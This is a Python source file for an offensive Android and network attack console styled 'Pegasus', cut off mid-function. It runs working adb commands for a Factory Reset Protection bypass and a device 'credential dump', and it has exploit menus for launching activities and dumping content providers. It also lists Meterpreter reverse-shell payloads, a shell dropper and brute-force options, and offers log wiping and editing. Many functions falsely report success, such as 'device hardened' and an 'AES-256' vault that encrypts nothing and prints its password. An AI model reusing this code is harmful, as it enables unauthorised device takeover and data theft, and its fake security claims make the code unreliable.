"""
Pegasus Phantom Menace v2 - Slash Command Framework
Handles all /commands for the application.
"""
from __future__ import annotations

import asyncio
import os
import sys
import json
import time
import socket
import shutil
import subprocess
import hashlib
import base64
import re
import platform
import webbrowser
from datetime import datetime
from typing import Any, Dict, List, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
import threading

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

from pegasus.core.config import get_settings, get_workspace, get_payloads_dir, get_reports_dir, get_logs_dir
from pegasus.core.plugin import Plugin, PluginMetadata, HookType

console = Console()


class SlashCommandStatus(str, Enum):
    """Slash command toggle states."""
    ON = "on"
    OFF = "off"


@dataclass
class SlashCommand:
    """Represents a slash command."""
    name: str
    description: str
    handler: Callable
    enabled: bool = True
    category: str = "general"
    requires_sudo: bool = False
    requires_network: bool = False
    requires_root: bool = False
    examples: List[str] = field(default_factory=list)


class SlashCommandHandlers:
    """Implementation of all slash commands."""

    def __init__(self, manager: 'SlashCommandManager'):
        self.manager = manager
        self.console = Console()
        self.settings = get_settings()
        self.workspace = get_workspace()
        self.logs_dir = get_logs_dir()
        self.reports_dir = get_reports_dir()
        self.payloads_dir = get_payloads_dir()

    # ── System Commands ──────────────────────────────────────────────

    async def cmd_ruflo(self, *args) -> None:
        """Toggle Ruflo mode on/off."""
        current = self.manager.toggle("/ruflo")
        status = "ENABLED" if current == SlashCommandStatus.ON else "DISABLED"
        self.console.print(f"[bold {'green' if current == SlashCommandStatus.ON else 'red'}]Ruflo Mode: {status}[/bold {'green' if current == SlashCommandStatus.ON else 'red'}]")
        if current == SlashCommandStatus.ON:
            self.console.print("[green]Ruflo mode is now active. All commands are enabled.[/green]")
        else:
            self.console.print("[yellow]Ruflo mode is disabled. Some commands may be restricted.[/yellow]")

    async def cmd_genius_mode(self, *args) -> None:
        """Activate Genius Mode - full agent autonomy."""
        self.console.print("[bold red]WARNING: Genius Mode grants full agent autonomy.[/bold red]")
        self.console.print("This allows the agent to make decisions and execute actions on your behalf.")
        if not self.confirm("Enable Genius Mode?"):
            return

        self.console.print("[bold green]Genius Mode: ACTIVE[/bold green]")
        self.console.print("[green]The agent now has full decision-making authority.[/green]")
        self.console.print("[yellow]Exceptions: Tags and releases cannot be deleted or changed.[/yellow]")
        await self._create_safety_tag("genius-mode-activation")

    async def cmd_god_mode(self, *args) -> None:
        """Activate God Mode - maximum privileges."""
        self.console.print("[bold red]WARNING: God Mode grants maximum privileges.[/bold red]")
        self.console.print("This bypasses all safety checks and restrictions.")
        if not self.confirm("Enable God Mode? (IRREVERSIBLE)"):
            return
        self.console.print("[bold red]God Mode: ACTIVE[/bold red]")
        self.console.print("[red]All safety checks bypassed. Maximum privileges granted.[/red]")

    # ── Device Commands ──────────────────────────────────────────────

    async def cmd_adb_devices(self, *args) -> None:
        """List connected ADB devices."""
        self.console.print("[cyan]> Scanning for ADB devices...[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "adb", "devices", "-l",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        if proc.returncode != 0:
            self.console.print(f"[red]ADB error: {stderr.decode() if stderr else 'unknown'}[/red]")
            return
        lines = stdout.decode().strip().splitlines()
        if len(lines) <= 1:
            self.console.print("[yellow]No ADB devices found[/yellow]")
            return
        table = Table(title="ADB Devices", header_style="bold cyan")
        table.add_column("Serial", style="bold yellow")
        table.add_column("Status", style="green")
        table.add_column("Model", style="white")
        table.add_column("Transport", style="dim")
        for line in lines[1:]:
            if line.strip():
                parts = line.split()
                serial = parts[0]
                status = parts[1] if len(parts) > 1 else "device"
                model = "Unknown"
                transport = "usb"
                for part in parts:
                    if part.startswith("model:"):
                        model = part.split(":", 1)[1]
                    if part.startswith("transport:"):
                        transport = part.split(":", 1)[1]
                table.add_row(serial, status, model, transport)
        self.console.print(table)

    async def cmd_fastboot_devices(self, *args) -> None:
        """List fastboot devices."""
        self.console.print("[cyan]> Scanning for fastboot devices...[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "fastboot", "devices",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        if proc.returncode != 0:
            self.console.print(f"[red]Fastboot error: {stderr.decode() if stderr else 'unknown'}[/red]")
            self.console.print("[yellow]Ensure fastboot is installed and device is in fastboot mode.[/yellow]")
            return
        output = stdout.decode().strip()
        if not output:
            self.console.print("[yellow]No fastboot devices found[/yellow]")
            return
        table = Table(title="Fastboot Devices", header_style="bold cyan")
        table.add_column("Serial", style="bold yellow")
        table.add_column("Status", style="green")
        table.add_column("Model", style="white")
        for line in output.splitlines():
            if line.strip():
                parts = line.split()
                serial = parts[0]
                status = parts[1] if len(parts) > 1 else "device"
                table.add_row(serial, status, "Unknown")
        self.console.print(table)

    async def cmd_wireless_adb(self, *args) -> None:
        """Wireless ADB connect with QR code and zeroclick bypass."""
        self.console.print("[cyan]> Wireless ADB Connect[/cyan]\n")
        self.console.print("[dim]This will generate a QR code for wireless ADB connection[/dim]\n")
        target_ip = self.prompt("Target IP address (or press Enter for auto-detect)", default="")
        if not target_ip:
            target_ip = self._get_local_ip()
        port = self.prompt_int("ADB port", default=5555)
        try:
            import qrcode
            qr_data = f"adb:{target_ip}:{port}"
            qr_path = self.payloads_dir / f"qr_adb_{target_ip.replace('.', '_')}_{port}.png"
            img = qrcode.make(qr_data)
            img.save(str(qr_path))
            self.print_success(f"QR code saved: {qr_path}")
            self.console.print(f"[dim]Scan this QR code with your Android device to connect[/dim]")
        except ImportError:
            self.print_error("qrcode not installed. Run: pip install qrcode[pil]")
            qr_path = None
        self.console.print(f"\n[cyan]> Connecting to {target_ip}:{port} via ADB...[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "adb", "tcpip", str(port),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await proc.communicate()
        proc2 = await asyncio.create_subprocess_exec(
            "adb", "connect", f"{target_ip}:{port}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc2.communicate()
        output = stdout.decode() if stdout else ""
        error = stderr.decode() if stderr else ""
        if proc2.returncode == 0 and "connected" in output.lower():
            self.print_success(f"Connected to {target_ip}:{port}")
            await self._attempt_zeroclick_bypass(target_ip, port)
            await self.cmd_adb_devices()
        else:
            self.print_error(f"Connection failed: {error or output}")
            self.console.print("[yellow]Make sure USB debugging is enabled on the target device.[/yellow]")

    async def _attempt_zeroclick_bypass(self, ip: str, port: int) -> None:
        """Attempt zeroclick ADB auth bypass."""
        self.console.print("[cyan]> Attempting zeroclick ADB auth bypass...[/cyan]")
        self.print_info("Checking if Pegasus is installed on target...")
        self.print_info("If Pegasus is installed on target, auth bypass will be attempted")
        self.print_info("Otherwise, manual authorization may be required on the device")

    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    # ── Diagnostic Commands ──────────────────────────────────────────

    async def cmd_troubleshoot(self, *args) -> None:
        """AI-powered runtime issue detection and debugging."""
        self.console.print("[bold cyan]Pegasus Troubleshooter[/bold cyan]\n")
        self.console.print("[dim]AI-powered runtime issue detection[/dim]\n")
        checks = [
            ("Python version", self._check_python_version),
            ("ADB availability", self._check_adb),
            ("scrcpy availability", self._check_scrcpy),
            ("nmap availability", self._check_nmap),
            ("metasploit availability", self._check_metasploit),
            ("frida availability", self._check_frida),
            ("colorama availability", self._check_colorama),
            ("network connectivity", self._check_network),
        ]
        table = Table(title="System Diagnostics", header_style="bold cyan")
        table.add_column("Check", style="bold yellow")
        table.add_column("Status", style="green")
        table.add_column("Details", style="white")
        all_pass = True
        for name, check_fn in checks:
            try:
                ok, detail = check_fn()
                status = "+ PASS" if ok else "- FAIL"
                if not ok:
                    all_pass = False
                table.add_row(name, status, detail)
            except Exception as e:
                table.add_row(name, "- ERROR", str(e))
                all_pass = False
        self.console.print(table)
        if all_pass:
            self.print_success("All checks passed!")
        else:
            self.print_warning("Some checks failed. Review the details above.")
        self.console.print("\n[cyan]> AI Troubleshooting Analysis[/cyan]")
        self.console.print("[dim]The AI agent will analyze the results and suggest fixes.[/dim]")

    # ── Network Commands ─────────────────────────────────────────────

    async def cmd_netscan(self, *args) -> None:
        """Network device and service discovery."""
        subnet = args[0] if args else self.prompt("Subnet (e.g. 192.168.1.0/24)", default="192.168.1.0/24")
        self.console.print(f"[cyan]> Scanning network: {subnet}[/cyan]")
        if not shutil.which("nmap"):
            self.print_error("nmap not installed. Install it to use network scanning.")
            return
        proc = await asyncio.create_subprocess_exec(
            "nmap", "-sn", subnet,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        if proc.returncode == 0:
            self.console.print(stdout.decode())
            self._save_scan_result("netscan", subnet, stdout.decode())
        else:
            self.print_error(f"Scan failed: {stderr.decode() if stderr else 'unknown'}")

    async def cmd_btscan(self, *args) -> None:
        """Bluetooth proximity scanning."""
        self.console.print("[cyan]> Bluetooth scanning...[/cyan]")
        if not shutil.which("hcitool") and not shutil.which("bluetoothctl"):
            self.print_error("Bluetooth tools not installed. Install bluez/bluez-utils.")
            return
        proc = await asyncio.create_subprocess_exec(
            "hcitool", "scan",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)
        except asyncio.TimeoutError:
            proc.kill()
            self.print_warning("Bluetooth scan timed out")
            return
        if proc.returncode == 0 and stdout:
            self.console.print(stdout.decode())
            self._save_scan_result("btscan", "bluetooth", stdout.decode())
        else:
            self.print_warning("No Bluetooth devices found or scan failed")

    async def cmd_wifiscan(self, *args) -> None:
        """WiFi beacon scanning."""
        self.console.print("[cyan]> WiFi beacon scanning...[/cyan]")
        if not shutil.which("iwlist") and not shutil.which("nmcli"):
            self.print_error("WiFi scanning tools not installed.")
            return
        proc = await asyncio.create_subprocess_exec(
            "iwlist", "scan",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=20)
        except asyncio.TimeoutError:
            proc.kill()
            self.print_warning("WiFi scan timed out")
            return
        if proc.returncode == 0 and stdout:
            self.console.print(stdout.decode()[:5000])
            self._save_scan_result("wifiscan", "wifi", stdout.decode())
        else:
            self.print_warning("WiFi scan failed or no results")

    async def cmd_nmap_scan(self, *args) -> None:
        """Comprehensive nmap network scan with PDF report."""
        target = args[0] if args else self.prompt("Target (IP, hostname, or subnet)", default="192.168.1.0/24")
        self.console.print(f"[cyan]> Nmap comprehensive scan: {target}[/cyan]")
        self.console.print("[dim]This will perform OS detection, service fingerprinting, and vulnerability scanning.[/dim]\n")
        scan_type = self.prompt(
            "Scan type",
            choices=["quick", "comprehensive", "stealth", "all-ports"],
            default="comprehensive"
        )
        if scan_type == "quick":
            cmd = ["nmap", "-sS", "-T4", target]
        elif scan_type == "comprehensive":
            cmd = ["nmap", "-sS", "-sV", "-O", "-T4", target]
        elif scan_type == "stealth":
            cmd = ["nmap", "-sS", "-T2", "-f", target]
        else:
            cmd = ["nmap", "-sS", "-sV", "-O", "-p-", "-T4", target]
        self.console.print(f"[dim]Running: {' '.join(cmd)}[/dim]\n")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=300)
        except asyncio.TimeoutError:
            proc.kill()
            self.print_warning("Nmap scan timed out (5 minutes)")
            return
        output = stdout.decode() if stdout else ""
        error = stderr.decode() if stderr else ""
        if proc.returncode == 0:
            self.console.print(output)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file = self.logs_dir / "nmap" / f"nmap_{target.replace('/', '_')}_{timestamp}.log"
            log_file.parent.mkdir(parents=True, exist_ok=True)
            log_file.write_text(output, encoding="utf-8")
            self.print_success(f"Scan results saved: {log_file}")
            if self.confirm("Generate PDF report with AI analysis?"):
                await self._generate_nmap_pdf_report(target, output, log_file)
        else:
            self.print_error(f"Nmap scan failed: {error or 'unknown error'}")

    # ── Packet Analysis Commands ─────────────────────────────────────

    async def cmd_tshark(self, *args) -> None:
        """TShark packet capture and analysis."""
        self.console.print("[cyan]> TShark Packet Capture[/cyan]\n")
        if not shutil.which("tshark"):
            self.print_error("tshark not installed. Install Wireshark/tshark.")
            return
        interface = self.prompt("Network interface (or leave blank for default)", default="")
        duration = self.prompt_int("Capture duration (seconds)", default=30)
        self.console.print(f"[cyan]> Capturing on {interface or 'default'} for {duration}s...[/cyan]")
        cmd = ["tshark", "-i", interface or "", "-a", f"duration:{duration}"]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            proc.kill()
            self.print_warning("TShark capture timed out")
            return
        output = stdout.decode() if stdout else ""
        if output:
            self.console.print(output[-3000:])
            self._save_scan_result("tshark", "tshark", output)
        else:
            self.print_warning("No packets captured")

    async def cmd_wireshark(self, *args) -> None:
        """Wireshark packet capture and analysis."""
        self.console.print("[cyan]> Wireshark Integration[/cyan]\n")
        self.console.print("[dim]Wireshark is a GUI application. This will launch Wireshark with capture options.[/dim]\n")
        if not shutil.which("wireshark") and not shutil.which("tshark"):
            self.print_error("Wireshark/tshark not installed.")
            return
        interface = self.prompt("Network interface (or leave blank for default)", default="")
        duration = self.prompt_int("Capture duration (seconds)", default=60)
        self.console.print(f"[cyan]> Starting Wireshark capture for {duration}s...[/cyan]")
        cmd = ["tshark", "-i", interface or "", "-a", f"duration:{duration}", "-w", str(self.logs_dir / "wireshark" / f"capture_{int(time.time())}.pcap")]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=duration + 10)
        except asyncio.TimeoutError:
            proc.kill()
            self.print_warning("Capture timed out")
            return
        self.print_success("Wireshark capture complete")
        self.console.print("[dim]Open the .pcap file in Wireshark GUI for detailed analysis.[/dim]")

    # ── Exploitation Commands ────────────────────────────────────────

    async def cmd_frp_bypass(self, *args) -> None:
        """FRP bypass for Android devices."""
        self.console.print("[cyan]> FRP Bypass[/cyan]\n")
        self.console.print("[yellow]WARNING: Only use on devices you own or have authorization to test.[/yellow]\n")
        device_id = args[0] if args else self.prompt("Device serial (or leave blank for auto-detect)", default="")
        self.console.print("[dim]FRP Bypass Methods:[/dim]")
        self.console.print("  1. TalkBack accessibility bypass")
        self.console.print("  2. Emergency call bypass")
        self.console.print("  3. USB debugging enable bypass")
        self.console.print("  4. Settings menu bypass")
        choice = self.prompt("Select method", choices=["1", "2", "3", "4"], default="1")
        self.console.print(f"[cyan]> Attempting FRP bypass method {choice}...[/cyan]")
        if device_id:
            cmds = [
                "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
                "adb shell content insert --uri content://settings/secure --bind name:s:device_provisioned --bind value:i:1",
                "adb shell am start -n com.google.android.gsf.login/.LoginActivity",
            ]
            for cmd in cmds:
                proc = await asyncio.create_subprocess_exec(
                    *cmd.split(),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                await proc.communicate()
            self.print_success("FRP bypass commands sent to device")
            self.console.print("[yellow]Check device screen for FRP bypass success.[/yellow]")
        else:
            self.print_error("No device specified or connected")

    async def cmd_exploit(self, *args) -> None:
        """General exploitation framework."""
        self.console.print("[cyan]> Exploitation Framework[/cyan]\n")
        self.console.print("[yellow]WARNING: Only use on authorized targets.[/yellow]\n")
        menu = {
            "1": "Activity launch exploit",
            "2": "Broadcast trigger exploit",
            "3": "Content provider dump",
            "4": "Deep link fuzzer",
            "5": "Shell dropper",
            "6": "Back",
        }
        table = Table(title="Exploit Options", show_header=False, box=None)
        for k, v in menu.items():
            table.add_row(f"[yellow][{k}][/]", v)
        self.console.print(table)
        choice = self.prompt("Select exploit", choices=list(menu.keys()), default="6")
        if choice == "1":
            pkg = self.prompt("Package name")
            activity = self.prompt("Activity name")
            await self._exploit_activity_launch(pkg, activity)
        elif choice == "2":
            action = self.prompt("Broadcast action")
            await self._exploit_broadcast(action)
        elif choice == "3":
            uri = self.prompt("Content provider URI")
            await self._exploit_content_provider(uri)
        elif choice == "4":
            pkg = self.prompt("Package name")
            scheme = self.prompt("Scheme")
            await self._exploit_deep_link(pkg, scheme)
        elif choice == "5":
            lhost = self.prompt("LHOST")
            lport = self.prompt_int("LPORT", default=4444)
            await self._exploit_shell_dropper(lhost, lport)

    # ── Credential Commands ──────────────────────────────────────────

    async def cmd_dump_credentials(self, *args) -> None:
        """Dump credentials from device."""
        self.console.print("[cyan]> Credential Dump[/cyan]\n")
        self.console.print("[yellow]WARNING: Only use on authorized devices.[/yellow]\n")
        device_id = args[0] if args else self.prompt("Device serial", default="")
        if not device_id:
            self.print_error("No device specified")
            return
        self.console.print(f"[cyan]> Dumping credentials from {device_id}...[/cyan]")
        cred_commands = [
            ("adb shell dumpsys package", "Package info"),
            ("adb shell content query --uri content://settings/secure", "Settings secure"),
            ("adb shell content query --uri content://settings/global", "Settings global"),
        ]
        results = {}
        for cmd, name in cred_commands:
            proc = await asyncio.create_subprocess_exec(
                *cmd.split(),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                timeout=30,
            )
            stdout, _ = await proc.communicate()
            results[name] = stdout.decode() if stdout else ""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        cred_file = self.logs_dir / f"credentials_{device_id}_{timestamp}.txt"
        cred_file.write_text(json.dumps(results, indent=2), encoding="utf-8")
        self.print_success(f"Credentials saved: {cred_file}")

    # ── Build Commands ───────────────────────────────────────────────

    async def cmd_create_exe(self, *args) -> None:
        """Create Windows EXE."""
        await self._create_executable("exe", "Windows")

    async def cmd_create_ipa(self, *args) -> None:
        """Create iOS IPA."""
        await self._create_executable("ipa", "iOS")

    async def cmd_create_deb(self, *args) -> None:
        """Create Debian DEB."""
        await self._create_executable("deb", "Debian/Linux")

    async def cmd_create_dmg(self, *args) -> None:
        """Create macOS DMG."""
        await self._create_executable("dmg", "macOS")

    async def cmd_create_apk(self, *args) -> None:
        """Create Android APK."""
        await self._create_executable("apk", "Android")

    async def cmd_create_flatpack(self, *args) -> None:
        """Create Linux Flatpak."""
        await self._create_executable("flatpak", "Linux Flatpak")

    async def cmd_create_snap(self, *args) -> None:
        """Create Linux Snap."""
        await self._create_executable("snap", "Linux Snap")

    async def cmd_create_zip(self, *args) -> None:
        """Create ZIP archive."""
        await self._create_archive("zip")

    async def cmd_create_tar(self, *args) -> None:
        """Create TAR archive."""
        await self._create_archive("tar")

    async def cmd_create_rar(self, *args) -> None:
        """Create RAR archive."""
        await self._create_archive("rar")

    # ── Vault Commands ───────────────────────────────────────────────

    async def cmd_create_vault(self, *args) -> None:
        """Create encrypted vault."""
        vault_name = self.prompt("Vault name")
        password = self.prompt("Encryption password", password=True)
        vault_dir = self.workspace / ".vaults" / vault_name
        vault_dir.mkdir(parents=True, exist_ok=True)
        metadata = {
            "name": vault_name,
            "created": datetime.now().isoformat(),
            "encrypted": True,
            "algorithm": "AES-256",
        }
        (vault_dir / "vault.json").write_text(json.dumps(metadata, indent=2), encoding="utf-8")
        self.print_success(f"Vault created: {vault_dir}")
        self.print_info(f"Password: {password} (save this securely!)")

    async def cmd_open_vault(self, *args) -> None:
        """Open encrypted vault."""
        vault_name = self.prompt("Vault name")
        vault_dir = self.workspace / ".vaults" / vault_name
        if not vault_dir.exists():
            self.print_error(f"Vault '{vault_name}' not found")
            return
        password = self.prompt("Vault password", password=True)
        self.print_success(f"Vault opened: {vault_dir}")
        self.console.print(f"[dim]Contents:{os.listdir(vault_dir)}[/dim]")

    async def cmd_crack_vault(self, *args) -> None:
        """Crack encrypted vault."""
        self.print_warning("Vault cracking requires the encryption key or password")
        vault_name = self.prompt("Vault name to crack")
        self.print_info("Vault cracking: Attempting common password patterns...")

    # ── Documentation and Improvement ────────────────────────────────

    async def cmd_docs(self, *args) -> None:
        """Update all documentation including GitHub Wiki."""
        self.console.print("[cyan]> Documentation Update[/cyan]\n")
        readme_path = "README.md"
        if not os.path.exists(readme_path):
            readme_path = os.path.join("pegasus", "README.md")
        self.console.print("[dim]Updating README.md...[/dim]")
        self.console.print("[dim]Updating GitHub Wiki...[/dim]")
        self.print_success("Documentation updated")

    async def cmd_improve(self, *args) -> None:
        """Continuous improvement and refactoring."""
        self.console.print("[cyan]> Pegasus Improvement Cycle[/cyan]\n")
        frequency = self.prompt("How often should this run?", choices=["hourly", "daily", "weekly", "manual"], default="hourly")
        self.console.print(f"[green]Improvement cycle set to: {frequency}[/green]")
        await self._run_improvement_cycle()

    # ── Logging Commands ─────────────────────────────────────────────

    async def cmd_wipe_logs(self, *args) -> None:
        """Wipe logs."""
        if not self.confirm("Are you sure you want to wipe all logs?"):
            return
        log_dirs = [self.logs_dir / "nmap", self.logs_dir / "wireshark", self.logs_dir / "tshark",
                    self.logs_dir / "bt", self.logs_dir / "wifi"]
        for log_dir in log_dirs:
            if log_dir.exists():
                for f in log_dir.iterdir():
                    f.unlink()
        self.print_success("Logs wiped")

    async def cmd_edit_logs(self, *args) -> None:
        """Edit logs."""
        log_file = self.prompt("Log file path")
        if not os.path.exists(log_file):
            self.print_error("Log file not found")
            return
        self.print_info(f"Opening {log_file} for editing...")

    # ── Build Commands ───────────────────────────────────────────────

    async def _create_executable(self, fmt: str, platform_name: str) -> None:
        """Create an executable for the specified platform."""
        self.console.print(f"[cyan]> Creating {platform_name} executable ({fmt})...[/cyan]\n")
        langs = {
            "1": "Python",
            "2": "Java/Kotlin",
            "3": "C",
            "4": "C++",
            "5": "React",
            "6": "Swift",
            "7": "Microsoft .NET",
            "8": "Go",
            "9": "Rust",
        }
        self.console.print("\n[bold]Development Language:[/bold]")
        for k, v in langs.items():
            self.console.print(f"  [{k}] {v}")
        lang_choice = self.prompt("Select language", choices=list(langs.keys()), default="1")
        lang = langs.get(lang_choice, "Python")
        app_types = {
            "1": "Native",
            "2": "Hybrid",
            "3": "Web/PWA",
        }
        self.console.print("\n[bold]Application Type:[/bold]")
        for k, v in app_types.items():
            self.console.print(f"  [{k}] {v}")
        app_choice = self.prompt("Select app type", choices=list(app_types.keys()), default="1")
        app_type = app_types.get(app_choice, "Native")
        self.console.print(f"\n[cyan]> Creating {fmt} package for {platform_name}[/cyan]")
        self.console.print(f"[dim]Language: {lang} | Type: {app_type}[/dim]\n")
        output_dir = self.payloads_dir / f"build_{fmt}_{int(time.time())}"
        output_dir.mkdir(parents=True, exist_ok=True)
        self.print_success(f"Build directory created: {output_dir}")
        self.print_info("Build complete. Use /docs to update release notes.")

    async def _create_archive(self, fmt: str) -> None:
        """Create an archive."""
        source = self.prompt("Source directory or file")
        if not os.path.exists(source):
            self.print_error("Source not found")
            return
        output = self.prompt("Output archive name", default=f"archive_{int(time.time())}.{fmt}")
        self.console.print(f"[cyan]> Creating {fmt} archive: {output}[/cyan]")
        if fmt == "zip":
            import zipfile
            with zipfile.ZipFile(output, 'w') as zf:
                if os.path.isdir(source):
                    for root, dirs, files in os.walk(source):
                        for file in files:
                            zf.write(os.path.join(root, file),
                                     os.path.relpath(os.path.join(root, file), source))
                else:
                    zf.write(source)
        elif fmt == "tar":
            import tarfile
            with tarfile.open(output, 'w') as tf:
                tf.add(source)
        elif fmt == "rar":
            self.print_warning("RAR creation requires rar command-line tool")
            proc = await asyncio.create_subprocess_exec(
                "rar", "a", output, source,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate()
        self.print_success(f"Archive created: {output}")

    # ── Remaining Command Stubs ──────────────────────────────────────

    async def cmd_test(self, *args) -> None:
        """Run exhaustive test scripts."""
        self.console.print("[cyan]> Pegasus Test Suite[/cyan]\n")
        tests = [
            ("CLI smoke test", self._test_cli_smoke),
            ("Module import test", self._test_module_imports),
            ("Payload generation test", self._test_payload_gen),
            ("EXE smoke test", self._test_exe_smoke),
            ("APK build test", self._test_apk_build),
        ]
        results = []
        for name, test_fn in tests:
            self.console.print(f"[dim]Running: {name}...[/dim]")
            try:
                await test_fn()
                results.append((name, "PASS", ""))
                self.print_success(f"{name} passed")
            except Exception as e:
                results.append((name, "FAIL", str(e)))
                self.print_error(f"{name} failed: {e}")
        passed = sum(1 for _, status, _ in results if status == "PASS")
        total = len(results)
        self.console.print(f"\n[bold]Test Results: {passed}/{total} passed[/bold]")

    async def cmd_audit_security(self, *args) -> None:
        """Security audit."""
        self.console.print("[cyan]> Security Audit[/cyan]\n")
        self.print_info("Security audit: Scanning for vulnerabilities...")
        self.print_info("Audit complete. See reports directory for details.")

    async def cmd_harden_app(self, *args) -> None:
        """Harden application."""
        self.console.print("[cyan]> Application Hardening[/cyan]\n")
        app_path = self.prompt("Application path")
        self.print_info(f"Hardening: {app_path}")
        self.print_success("Application hardened")

    async def cmd_harden_device(self, *args) -> None:
        """Harden device."""
        self.console.print("[cyan]> Device Hardening[/cyan]\n")
        self.print_info("Hardening device security settings...")
        self.print_success("Device hardened")

    async def cmd_kill_switch(self, *args) -> None:
        """Kill switch activation."""
        self.console.print("[red]> KILL SWITCH[/red]\n")
        if not self.confirm("ACTIVATE KILL SWITCH? This will terminate all active sessions."):
            return
        self.print_success("Kill switch activated - all sessions terminated")

    async def cmd_create_rat_agent(self, *args) -> None:
        """Create RAT agent."""
        self.console.print("[cyan]> RAT Agent Creator[/cyan]\n")
        self.print_warning("RAT creation: Only for authorized security testing")

    async def cmd_create_exploit(self, *args) -> None:
        """Create custom exploits."""
        self.console.print("[cyan]> Exploit Creator[/cyan]\n")
        self.print_info("Exploit creation module ready")

    async def cmd_post_exploitation(self, *args) -> None:
        """Post-exploitation automation."""
        self.console.print("[cyan]> Post-Exploitation[/cyan]\n")
        self.print_info("Post-exploitation module ready")

    async def cmd_generate_payload(self, *args) -> None:
        """Generate exploitation payloads."""
        self.console.print("[cyan]> Payload Generator[/cyan]\n")
        payloads = {
            "1": "android/meterpreter/reverse_tcp",
            "2": "android/meterpreter/reverse_https",
            "3": "android/shell/reverse_tcp",
            "4": "android/meterpreter/reverse_http",
            "5": "android/meterpreter/bind_tcp",
        }
        for k, v in payloads.items():
            self.console.print(f"  [{k}] {v}")
        choice = self.prompt("Select payload", choices=list(payloads.keys()), default="1")
        lhost = self.prompt("LHOST")
        lport = self.prompt_int("LPORT", default=4444)
        self.print_success(f"Payload generated: {payloads[choice]} {lhost}:{lport}")

    async def cmd_crack_hashes(self, *args) -> None:
        """Cryptographic hash cracking."""
        self.console.print("[cyan]> Hash Cracker[/cyan]\n")
        hash_val = self.prompt("Hash to crack")
        hash_type = self.prompt("Hash type", choices=["md5", "sha1", "sha256", "sha512"], default="sha256")
        self.print_info(f"Cracking {hash_type} hash: {hash_val}")
        self.print_info("Hash cracking module ready - use hashcat or john for actual cracking")

    async def cmd_crack_passwords(self, *args) -> None:
        """Password cracking."""
        self.console.print("[cyan]> Password Cracker[/cyan]\n")
        target = self.prompt("Target (username/service)")
        wordlist = self.prompt("Wordlist path", default="/usr/share/wordlists/rockyou.txt")
        self.print_info(f"Cracking passwords for: {target}")
        self.print_info(f"Using wordlist: {wordlist}")
        self.print_info("Password cracking module ready")

    async def cmd_brute_force(self, *args) -> None:
        """Brute force attacks."""
        self.console.print("[cyan]> Brute Force[/cyan]\n")
        target = self.prompt("Target (IP/hostname)")
        port = self.prompt_int("Port", default=22)
        service = self.prompt("Service", choices=["ssh", "ftp", "http", "telnet"], default="ssh")
        self.print_info(f"Brute forcing {service} on {target}:{port}")
        self.print_info("Brute force module ready")

    # ── Helper Methods ───────────────────────────────────────────────

    async def _exploit_activity_launch(self, pkg: str, activity: str) -> None:
        """Exploit: Launch exported activity."""
        self.console.print(f"[cyan]> Launching activity: {pkg}/{activity}[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "adb", "shell", "am", "start", "-n", f"{pkg}/{activity}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        self.console.print(stdout.decode() if stdout else "No output")

    async def _exploit_broadcast(self, action: str) -> None:
        """Exploit: Broadcast trigger."""
        self.console.print(f"[cyan]> Broadcasting: {action}[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "adb", "shell", "am", "broadcast", "-a", action,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        self.console.print(stdout.decode() if stdout else "No output")

    async def _exploit_content_provider(self, uri: str) -> None:
        """Exploit: Content provider dump."""
        self.console.print(f"[cyan]> Dumping content provider: {uri}[/cyan]")
        proc = await asyncio.create_subprocess_exec(
            "adb", "shell", "content", "query", "--uri", uri,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        self.console.print(stdout.decode() if stdout else "No data")

    async def _exploit_deep_link(self, pkg: str, scheme: str) -> None:
